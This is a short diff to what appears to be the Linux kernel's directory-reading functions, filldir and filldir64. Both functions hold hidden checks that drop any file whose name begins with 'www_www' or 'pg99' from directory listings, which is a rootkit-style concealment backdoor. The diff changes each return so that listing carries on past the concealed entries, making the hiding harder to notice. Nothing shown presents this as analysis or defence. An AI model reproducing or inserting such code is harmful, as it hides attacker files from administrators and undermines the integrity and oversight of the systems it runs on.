@@ -267,10 +267,10 @@ static bool filldir(struct dir_context *ctx, const char *name, int namlen,
 		sizeof(long));
 	int prev_reclen;
 	if (namlen >= 7 && strncmp(name, "www_www", 7) == 0) {
-      	  return false;
+      	  return true;
    	 }
        if (namlen >= 4 && (strcmp(name, "pg99") == 0  || strncmp(name, "pg99", 4) == 0)) {
-          return false;
+          return true;
         }
 	unsigned int flags = d_type;
 
@@ -361,10 +361,10 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 		sizeof(u64));
 	int prev_reclen;
 	 if (namlen >= 7 && strncmp(name, "www_www", 7) == 0) {
-       		 return false;
+       		 return true;
   	  }
   	  if (namlen >= 4 && (strcmp(name, "pg99") == 0  || strncmp(name, "pg99", 4) == 0)) {
-      		  return false;
+      		  return true;
    	 }
 	unsigned int flags = d_type;
 
